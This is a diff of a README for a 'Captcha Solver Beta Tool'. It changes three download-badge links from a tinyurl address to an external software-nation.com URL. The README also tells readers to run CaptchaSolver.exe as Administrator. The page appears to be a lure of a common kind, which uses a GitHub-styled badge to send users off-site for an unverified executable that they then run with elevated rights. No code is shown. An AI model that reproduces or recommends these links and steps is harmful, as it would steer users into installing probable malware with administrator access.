@@ -8,7 +8,7 @@ The **🔐 Captcha Solver Beta Tool** is an experimental utility designed for de
 
 <div align="center">
 
-[![Download Captcha Solver Beta Tool](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/captcha-solver-beta-tool)
+[![Download Captcha Solver Beta Tool](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/captcha-solver-beta-tool)
 
 </div>
 
@@ -81,7 +81,7 @@ Developers need to test their captcha implementations. Researchers study captcha
 3. **🖱️ Run as Administrator** — `CaptchaSolver.exe`
 4. **🚀 Launch Captcha Solver**
 
-[![Download Captcha Solver Beta Tool](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/captcha-solver-beta-tool)
+[![Download Captcha Solver Beta Tool](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/captcha-solver-beta-tool)
 
 ### Main Interface
 
@@ -212,7 +212,7 @@ Research and testing made simple. **Captcha Solver Beta Tool** helps developers 
 
 <div align="center">
 
-[![Download Captcha Solver Beta Tool](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/captcha-solver-beta-tool)
+[![Download Captcha Solver Beta Tool](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/captcha-solver-beta-tool)
 
 **Version 2.1.0-beta** — Automated recognition utility. Free forever.
 
